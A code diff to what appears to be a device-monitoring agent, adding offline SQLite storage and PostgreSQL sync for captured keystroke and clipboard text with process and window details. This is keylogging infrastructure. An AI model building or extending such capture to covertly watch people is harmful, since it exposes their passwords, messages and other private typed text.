@@ -48,6 +48,18 @@ def init_offline_storage():
             created_at TEXT NOT NULL
         );
 
+        CREATE TABLE IF NOT EXISTS offline_keystrokes (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            device_id INTEGER NOT NULL,
+            process_name TEXT NOT NULL,
+            window_title TEXT,
+            category_name TEXT DEFAULT 'Other',
+            content TEXT NOT NULL,
+            log_type TEXT DEFAULT 'keystroke',
+            character_count INTEGER DEFAULT 0,
+            recorded_at TEXT NOT NULL
+        );
+
         CREATE TABLE IF NOT EXISTS cached_rules (
             process_name TEXT PRIMARY KEY,
             friendly_name TEXT,
@@ -240,8 +252,30 @@ def queue_offline_alert(device_id, process_name, alert_type, message):
         """, (device_id, process_name, alert_type, message, now_str))
     conn.close()
 
+def queue_offline_keystroke_batch(device_id, batch):
+    """Queues typed text and clipboard logs into SQLite when PostgreSQL is offline."""
+    if not batch:
+        return
+    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    conn = get_sqlite_conn()
+    with conn:
+        for item in batch:
+            # item: (process_name, window_title, category_name, content, log_type, recorded_at)
+            pname = item[0]
+            title = item[1]
+            cat = item[2] if len(item) > 2 else "Other"
+            content = item[3]
+            ltype = item[4] if len(item) > 4 else "keystroke"
+            rec_at = item[5] if len(item) > 5 and item[5] else now_str
+            char_count = len(content) if content else 0
+            conn.execute("""
+            INSERT INTO offline_keystrokes (device_id, process_name, window_title, category_name, content, log_type, character_count, recorded_at)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?);
+            """, (device_id, pname, title, cat, content, ltype, char_count, str(rec_at)))
+    conn.close()
+
 def drain_offline_queue_to_postgres():
-    """Flushes all queued offline logs and alerts into PostgreSQL."""
+    """Flushes all queued offline logs, alerts, and keystrokes into PostgreSQL."""
     conn = get_sqlite_conn()
     cur = conn.cursor()
     cur.execute("SELECT id, device_id, process_name, window_title, category_name, duration_seconds, recorded_at FROM offline_logs ORDER BY id ASC LIMIT 500;")
@@ -266,7 +300,6 @@ def drain_offline_queue_to_postgres():
             print(f"[Offline Sync] Successfully synced {len(rows)} offline activity records to PostgreSQL!")
         except Exception as e:
             conn.close()
-            # print(f"[Offline Sync Error] PostgreSQL sync failed: {e}")
             return False
 
     # Also drain offline alerts
@@ -288,6 +321,28 @@ def drain_offline_queue_to_postgres():
             with conn:
                 conn.execute(f"DELETE FROM offline_alerts WHERE id IN ({','.join(['?']*len(a_ids))});", a_ids)
             print(f"[Offline Sync] Successfully synced {len(alert_rows)} offline alert records to PostgreSQL!")
+        except Exception:
+            pass
+
+    # Also drain offline keystrokes
+    cur.execute("SELECT id, device_id, process_name, window_title, category_name, content, log_type, character_count, recorded_at FROM offline_keystrokes ORDER BY id ASC LIMIT 200;")
+    key_rows = cur.fetchall()
+    if key_rows:
+        try:
+            import database
+            with database.get_db() as pg_conn:
+                with pg_conn.cursor() as pg_cur:
+                    for k in key_rows:
+                        pg_cur.execute("""
+                        INSERT INTO keystroke_logs (device_id, process_name, window_title, category_name, content, log_type, character_count, recorded_at)
+                        VALUES (%s, %s, %s, %s, %s, %s, %s, %s);
+                        """, (k["device_id"], k["process_name"], k["window_title"], k["category_name"], k["content"], k["log_type"], k["character_count"], k["recorded_at"]))
+                pg_conn.commit()
+
+            k_ids = [k["id"] for k in key_rows]
+            with conn:
+                conn.execute(f"DELETE FROM offline_keystrokes WHERE id IN ({','.join(['?']*len(k_ids))});", k_ids)
+            print(f"[Offline Sync] Successfully synced {len(key_rows)} offline keystroke records to PostgreSQL!")
         except Exception:
             pass
 
